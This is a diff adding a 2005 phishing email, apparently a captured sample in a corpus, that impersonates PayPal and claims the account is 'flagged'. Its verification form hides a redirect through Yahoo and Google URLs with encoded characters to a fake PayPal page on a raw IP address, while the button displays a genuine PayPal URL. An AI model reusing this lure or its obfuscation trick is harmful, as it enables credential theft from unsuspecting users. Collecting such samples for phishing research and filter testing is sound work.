@@ -1,0 +1,150 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <netshare@p6.ich-3.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id EDD39536E90
+ for <username@login.domain.com>; Sat, 30 Apr 2005 12:35:35 -0400 (EDT)
+Received: from p6.ich-3.com (unknown [67.19.105.42])
+ by mail1.domain.com (Postfix) with ESMTP id C1FB985AD8B
+ for <username@domain.com>; Sat, 30 Apr 2005 12:35:35 -0400 (EDT)
+Received: from netshare by p6.ich-3.com with local (Exim 4.43)
+ id 1DRuwI-0008KT-6O
+ for username@domain.com; Sat, 30 Apr 2005 11:35:34 -0500
+To: username@domain.com
+Subject: PayPal Flagged Account
+From: PayPal <service@paypal.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1DRuwI-0008KT-6O@p6.ich-3.com>
+Date: Sat, 30 Apr 2005 11:35:34 -0500
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - p6.ich-3.com
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [32627 32628] / [47 12]
+X-AntiAbuse: Sender Address Domain - p6.ich-3.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 304
+
+</style>
+</head>
+
+<BODY><TABLE><TR><TD bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0" align="center">
+<tr valign="top">
+	<td><a href="https://www.paypal.com/us" target="_blank" ><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal" border="0"></a></td>
+</tr>
+</table>
+
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif" width="100%"><img src="http://images.paypal.com/images/pixel.gif" height="29" width="1" border="0"></td>
+</tr>
+<tr>
+	<td><img src="http://images.paypal.com/images/pixel.gif" height="10" width="1" border="0"></td>
+</tr>
+</table>
+
+<table width="600" cellspacing="0" cellpadding="0" border="0" align="left">
+<tr valign="top">
+	<td width="400">
+	<table width="100%" cellspacing="0" cellpadding="2" border="0">
+		<tr>
+			<td>Dear PayPal Member,<br><br>
+Your account has been randomly flagged in our system as a part of our routine security measures. 
+This is a must to ensure that only you have access and use of your PayPal account and to ensure a safe PayPal experience. We require all flagged accounts to verify their information on file with us. To verify your Information at this time, please visit our secure server webform by clicking the hyperlink below:
+<br><br>
+ 
+<table width="70%" cellpadding="0" cellspacing="0" border="0" bgcolor="#FFFFFF" align="center">
+<tr>
+<td>
+	<table width="50%" cellpadding="4" cellspacing="0" border="0" bgcolor="#FFFFFF" align="center">
+			<FORM target="_blank"  ACTION=http://rds.yaho&#010;o.com/*http://www&#009;.google.com/url  METHOD=get>
+<INPUT TYPE=HIDDEN NAME=q VALUE=http://rds.yahoo.com/*http://203.115.22.179/.us/paypal.com/webscr/>
+<input type=submit style="color:#000080; border:solid 0px; background:#white;" value=https://www.paypal.com/cgi-bin/webscr?cmd=_update>
+</form><br>
+</td>
+		</tr>
+	</table>
+</td>
+</tr>
+</table>
+
+ Thank you for using PayPal!<br>
+The PayPal Team</td>
+</tr>
+
+<tr>
+<td>
+<hr class="dotted">
+</td>
+</tr>
+
+<tr>
+<td>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td class="pp_footer">Please do not reply to this e-mail. Mail sent
+to this address cannot be answered. For assistance, log
+in</a> to your PayPal account and choose the "Help" link in the
+footer of any page.<br>
+<br class="h10">
+ To receive email notifications in plain text instead of HTML,
+update your preferences <a href="https://www.paypal.com/us/PREFS-NOTI" target="_blank" > here</a>.</td>
+</tr>
+
+<tr>
+	<td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1" border="0"></td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr>
+	<td><br><span class="pp_footer">PayPal Email ID PP478<br><br></span></td>
+</tr>
+</table>
+</td>
+<td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="1" width="10" border="0"></td>
+<td width="190" valign="top">
+<table width="100%" cellspacing="0" cellpadding="1" border="0" bgcolor="#CCCCCC">
+<tr>
+	<td>
+	<table width="100%" cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff">
+	<tr>
+	<td>
+		<table width="100%" cellspacing="0" cellpadding="5" border="0" bgcolor="#EEEEEE">
+		<tr>
+		<td class="pp_sidebartextbold" align="center">Protect Your Account Info</td>
+		</tr>
+		</table>
+		
+<table width="100%" cellspacing="0" cellpadding="5" border="0">
+<tr>
+<td class="pp_sidebartext">Make sure you never provide your
+password to fraudulent websites.<br>
+<br>
+To safely and securely access the PayPal website or your account,
+open up a new web browser (e.g. Internet Explorer or Netscape) and
+type in the PayPal URL (http://www.paypal.com/).<br>
+<br>
+PayPal will never ask you to enter your password in an email.<br>
+<br>
+ For more information on protecting yourself from fraud, please
+review our Security Tips at http://www.paypal.com/securitytips<br>
+<img src="http://images.paypal.com/en_US/images/pixel.gif" height=
+"5" width="1" border="0"></td>
+</tr>
+</table>
+</td>
+</tr>
+
+
